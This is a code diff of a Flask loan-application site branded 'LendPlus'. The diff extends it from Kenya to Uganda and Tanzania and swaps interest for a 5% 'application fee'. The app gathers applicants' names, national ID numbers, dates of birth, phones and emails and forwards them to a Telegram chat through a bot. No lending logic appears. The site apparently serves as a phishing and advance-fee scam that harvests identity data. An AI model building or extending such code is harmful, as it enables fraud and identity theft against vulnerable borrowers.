@@ -15,46 +15,57 @@ app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)
 
 # ==================== CONFIGURATION ====================
-# Try multiple possible environment variable names
-TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN') or os.environ.get('BOT_TOKEN') or os.environ.get('TELEGRAM_BOT_TOKEN')
-TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID') or os.environ.get('CHAT_ID') or os.environ.get('TELEGRAM_CHATID')
-
-# Debug logging
-logger.info("=" * 60)
-logger.info("🔍 ENVIRONMENT VARIABLE CHECK:")
-logger.info(f"TELEGRAM_TOKEN: {'✅ SET' if TELEGRAM_TOKEN else '❌ NOT SET'}")
-logger.info(f"TELEGRAM_CHAT_ID: {'✅ SET' if TELEGRAM_CHAT_ID else '❌ NOT SET'}")
-if TELEGRAM_TOKEN:
-    logger.info(f"Token starts with: {TELEGRAM_TOKEN[:10]}...")
-if TELEGRAM_CHAT_ID:
-    logger.info(f"Chat ID: {TELEGRAM_CHAT_ID}")
-logger.info("=" * 60)
-
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 
-if TELEGRAM_ENABLED:
-    logger.info("✅ Telegram is ENABLED")
-else:
-    logger.warning("⚠️ Telegram is DISABLED - check environment variables")
+# Country Configuration
+COUNTRIES = {
+    'kenya': {
+        'name': 'Kenya',
+        'currency': 'KES',
+        'currency_symbol': 'KSh',
+        'phone_prefix': '+254',
+        'flag': '🇰🇪',
+        'min_loan': 1000,
+        'max_loan': 50000
+    },
+    'uganda': {
+        'name': 'Uganda',
+        'currency': 'UGX',
+        'currency_symbol': 'USh',
+        'phone_prefix': '+256',
+        'flag': '🇺🇬',
+        'min_loan': 50000,
+        'max_loan': 2000000
+    },
+    'tanzania': {
+        'name': 'Tanzania',
+        'currency': 'TZS',
+        'currency_symbol': 'TSh',
+        'phone_prefix': '+255',
+        'flag': '🇹🇿',
+        'min_loan': 10000,
+        'max_loan': 500000
+    }
+}
 
 APP_NAME = "LendPlus"
 COMPANY_NAME = "Aventus Technology Limited"
 SUPPORT_PHONE = "+254 709 029 000"
 SUPPORT_EMAIL = "customer@lendplus.ke"
-MIN_LOAN = 1000
-MAX_LOAN = 50000
+APPLICATION_FEE_PERCENT = 5  # 5% application fee
 
 LOAN_PRODUCTS = {
-    'small': {'min': 1000, 'max': 10000, 'interest': 5, 'months': 1},
-    'medium': {'min': 10001, 'max': 30000, 'interest': 8, 'months': 3},
-    'large': {'min': 30001, 'max': 50000, 'interest': 12, 'months': 6}
+    'small': {'min': 1000, 'max': 10000, 'fee': 5, 'months': 1},
+    'medium': {'min': 10001, 'max': 30000, 'fee': 8, 'months': 3},
+    'large': {'min': 30001, 'max': 50000, 'fee': 12, 'months': 6}
 }
 # ==================== END CONFIG ====================
 
 def send_telegram_message(message):
     """Send message to Telegram"""
     if not TELEGRAM_ENABLED:
-        logger.warning("⚠️ Telegram not configured - message not sent")
         return None
     
     try:
@@ -64,49 +75,43 @@ def send_telegram_message(message):
             'text': message,
             'parse_mode': 'HTML'
         }
-        logger.info(f"📤 Sending to Telegram...")
         response = requests.post(url, json=payload, timeout=30)
-        
         if response.status_code == 200:
-            logger.info("✅ Telegram message sent successfully!")
             return response.json()
-        else:
-            logger.error(f"❌ Telegram error: {response.status_code} - {response.text}")
-            return None
-            
+        return None
     except Exception as e:
-        logger.error(f"❌ Telegram error: {e}")
+        logger.error(f"Telegram error: {e}")
         return None
 
 def format_application_message(data):
     """Format application for Telegram"""
     amount = data.get('loan_amount', 0)
-    if amount <= 10000:
-        rate, months = 5, 1
-    elif amount <= 30000:
-        rate, months = 8, 3
-    else:
-        rate, months = 12, 6
-    
-    interest = amount * (rate / 100)
-    total = amount + interest
+    fee_rate = data.get('fee_rate', 5)
+    fee_amount = amount * (fee_rate / 100)
+    total = amount + fee_amount
+    months = data.get('months', 1)
+    country = data.get('country', 'Kenya')
+    currency = data.get('currency', 'KES')
     
     return f"""
 📋 <b>NEW LOAN APPLICATION</b>
 ━━━━━━━━━━━━━━━━━━━━━
 
+🌍 <b>Application Details</b>
+• Country: {data.get('flag', '')} {country}
+• Currency: {currency}
+
 👤 <b>Personal Information</b>
 • Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
-• Phone: +254 {data.get('phone', 'N/A')}
+• Phone: {data.get('phone', 'N/A')}
 • Email: {data.get('email', 'N/A')}
 • ID Number: {data.get('national_id', 'N/A')}
 • Gender: {data.get('gender', 'N/A')}
 
 💰 <b>Loan Details</b>
-• Amount: KES {amount:,.2f}
-• Interest Rate: {rate}%
-• Interest Amount: KES {interest:,.2f}
-• Total Repayment: KES {total:,.2f}
+• Amount: {currency} {amount:,.2f}
+• Application Fee: {fee_rate}% ({currency} {fee_amount:,.2f})
+• Total Payable: {currency} {total:,.2f}
 • Term: {months} month(s)
 
 🕐 <b>Application Time</b>
@@ -119,24 +124,39 @@ def format_application_message(data):
 📱 Support: {SUPPORT_PHONE}
 """
 
-def calculate_loan_details(amount):
-    """Calculate loan interest and repayment"""
-    if amount <= 10000:
-        product = LOAN_PRODUCTS['small']
-    elif amount <= 30000:
-        product = LOAN_PRODUCTS['medium']
-    else:
-        product = LOAN_PRODUCTS['large']
+def calculate_loan_details(amount, country):
+    """Calculate loan fee and repayment"""
+    # Get country-specific loan products
+    if country == 'kenya':
+        if amount <= 10000:
+            fee_rate, months = 5, 1
+        elif amount <= 30000:
+            fee_rate, months = 8, 3
+        else:
+            fee_rate, months = 12, 6
+    elif country == 'uganda':
+        if amount <= 500000:
+            fee_rate, months = 5, 1
+        elif amount <= 1000000:
+            fee_rate, months = 8, 3
+        else:
+            fee_rate, months = 12, 6
+    else:  # Tanzania
+        if amount <= 100000:
+            fee_rate, months = 5, 1
+        elif amount <= 300000:
+            fee_rate, months = 8, 3
+        else:
+            fee_rate, months = 12, 6
     
-    interest = amount * (product['interest'] / 100)
-    total = amount + interest
+    fee_amount = amount * (fee_rate / 100)
+    total = amount + fee_amount
     
     return {
-        'product': product,
-        'interest': interest,
+        'fee_rate': fee_rate,
+        'fee_amount': fee_amount,
         'total': total,
-        'interest_rate': product['interest'],
-        'months': product['months']
+        'months': months
     }
 
 def generate_application_id():
@@ -147,39 +167,51 @@ def generate_application_id():
 
 @app.route('/')
 def index():
+    """Homepage"""
     return render_template('index.html', 
                          app_name=APP_NAME,
                          support_phone=SUPPORT_PHONE,
                          company_name=COMPANY_NAME,
-                         support_email=SUPPORT_EMAIL)
+                         support_email=SUPPORT_EMAIL,
+                         countries=COUNTRIES)
 
 @app.route('/apply', methods=['GET', 'POST'])
 def apply():
+    """Step 1: Phone number entry"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
+        country = request.form.get('country', 'kenya')
+        
+        # Remove non-numeric characters
         phone = ''.join(filter(str.isdigit, phone))
         
         if phone and len(phone) >= 7:
             session['phone'] = phone
+            session['country'] = country
             session['verified'] = True
+            logger.info(f"📱 Phone: {phone}, Country: {country}")
             return redirect(url_for('personal_info'))
         else:
             error = "Please enter a valid phone number (at least 7 digits)"
-            return render_template('apply.html', error=error)
+            return render_template('apply.html', error=error, countries=COUNTRIES)
     
-    return render_template('apply.html')
+    return render_template('apply.html', countries=COUNTRIES)
 
 @app.route('/personal-info', methods=['GET', 'POST'])
 def personal_info():
+    """Step 2: Personal information"""
     if 'phone' not in session:
         return redirect(url_for('apply'))
+    
+    country = session.get('country', 'kenya')
+    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
     
     if request.method == 'POST':
         required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
         for field in required:
             if not request.form.get(field, '').strip():
                 error = "Please fill in all required fields"
-                return render_template('personal_info.html', error=error)
+                return render_template('personal_info.html', error=error, country_data=country_data)
         
         session['first_name'] = request.form.get('first_name').strip()
         session['last_name'] = request.form.get('last_name').strip()
@@ -192,22 +224,35 @@ def personal_info():
         
         return redirect(url_for('loan_amount'))
     
-    return render_template('personal_info.html')
+    return render_template('personal_info.html', country_data=country_data)
 
 @app.route('/loan-amount', methods=['GET', 'POST'])
 def loan_amount():
+    """Step 3: Loan amount selection"""
     if 'phone' not in session:
         return redirect(url_for('apply'))
+    
+    country = session.get('country', 'kenya')
+    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
+    currency = country_data['currency']
+    currency_symbol = country_data['currency_symbol']
+    min_loan = country_data['min_loan']
+    max_loan = country_data['max_loan']
     
     if request.method == 'POST':
         try:
             amount = float(request.form.get('loan_amount', 0))
             
-            if amount < MIN_LOAN or amount > MAX_LOAN:
-                error = f"Loan amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}"
-                return render_template('loan_amount.html', error=error)
+            if amount < min_loan or amount > max_loan:
+                error = f"Loan amount must be between {currency_symbol} {min_loan:,.0f} and {currency_symbol} {max_loan:,.0f}"
+                return render_template('loan_amount.html', error=error, 
+                                     country_data=country_data, 
+                                     min_loan=min_loan, 
+                                     max_loan=max_loan,
+                                     currency=currency,
+                                     currency_symbol=currency_symbol)
             
-            details = calculate_loan_details(amount)
+            details = calculate_loan_details(amount, country)
             application_id = generate_application_id()
             
             application_data = {
@@ -218,56 +263,62 @@ def loan_amount():
                 'national_id': session.get('national_id', ''),
                 'gender': session.get('gender', ''),
                 'dob': session.get('dob', ''),
+                'country': country_data['name'],
+                'flag': country_data['flag'],
+                'currency': currency,
+                'currency_symbol': currency_symbol,
                 'loan_amount': amount,
-                'interest': details['interest'],
+                'fee_rate': details['fee_rate'],
+                'fee_amount': details['fee_amount'],
                 'total': details['total'],
-                'interest_rate': details['interest_rate'],
                 'months': details['months'],
                 'application_id': application_id
             }
             
             logger.info("=" * 50)
-            logger.info("📋 APPLICATION RECEIVED")
+            logger.info(f"📋 APPLICATION RECEIVED - {country_data['flag']} {country_data['name']}")
             logger.info(f"Name: {application_data['first_name']} {application_data['last_name']}")
             logger.info(f"Phone: {application_data['phone']}")
-            logger.info(f"Amount: {application_data['loan_amount']}")
+            logger.info(f"Amount: {currency} {application_data['loan_amount']}")
             logger.info(f"Application ID: {application_id}")
             logger.info("=" * 50)
             
             # Send to Telegram
             if TELEGRAM_ENABLED:
                 try:
-                    logger.info("📤 Attempting to send to Telegram...")
                     message = format_application_message(application_data)
-                    result = send_telegram_message(message)
-                    
-                    if result:
-                        logger.info("✅ Application sent to Telegram successfully!")
-                        # Send quick notification too
-                        send_telegram_message(
-                            f"🔔 New application from {application_data['first_name']} "
-                            f"{application_data['last_name']} for KES {amount:,.2f}"
-                        )
-                    else:
-                        logger.error("❌ Failed to send to Telegram")
+                    send_telegram_message(message)
+                    send_telegram_message(
+                        f"🔔 {country_data['flag']} New application from {application_data['first_name']} "
+                        f"{application_data['last_name']} for {currency} {amount:,.2f}"
+                    )
+                    logger.info("✅ Application sent to Telegram")
                 except Exception as e:
-                    logger.error(f"❌ Telegram error: {e}")
-                    logger.error(traceback.format_exc())
-            else:
-                logger.warning("⚠️ Telegram is disabled - no notification sent")
+                    logger.error(f"Telegram error: {e}")
             
             session['application_data'] = application_data
             return redirect(url_for('confirmation'))
             
         except Exception as e:
-            logger.error(f"❌ Error: {e}")
+            logger.error(f"Error: {e}")
             error = "An error occurred. Please try again."
-            return render_template('loan_amount.html', error=error)
+            return render_template('loan_amount.html', error=error, 
+                                 country_data=country_data,
+                                 min_loan=min_loan,
+                                 max_loan=max_loan,
+                                 currency=currency,
+                                 currency_symbol=currency_symbol)
     
-    return render_template('loan_amount.html', min_loan=MIN_LOAN, max_loan=MAX_LOAN)
+    return render_template('loan_amount.html', 
+                         country_data=country_data,
+                         min_loan=min_loan,
+                         max_loan=max_loan,
+                         currency=currency,
+                         currency_symbol=currency_symbol)
 
 @app.route('/confirmation')
 def confirmation():
+    """Step 4: Application confirmation"""
     if 'phone' not in session:
         return redirect(url_for('apply'))
     
@@ -279,11 +330,16 @@ def confirmation():
                          first_name=data.get('first_name', ''),
                          last_name=data.get('last_name', ''),
                          amount=data.get('loan_amount', 0),
-                         interest=data.get('interest', 0),
+                         fee_rate=data.get('fee_rate', 5),
+                         fee_amount=data.get('fee_amount', 0),
                          total=data.get('total', 0),
                          months=data.get('months', 0),
                          application_id=data.get('application_id', ''),
-                         support_phone=SUPPORT_PHONE)
+                         support_phone=SUPPORT_PHONE,
+                         country=data.get('country', 'Kenya'),
+                         flag=data.get('flag', '🇰🇪'),
+                         currency=data.get('currency', 'KES'),
+                         currency_symbol=data.get('currency_symbol', 'KSh'))
 
 @app.route('/dashboard')
 def dashboard():
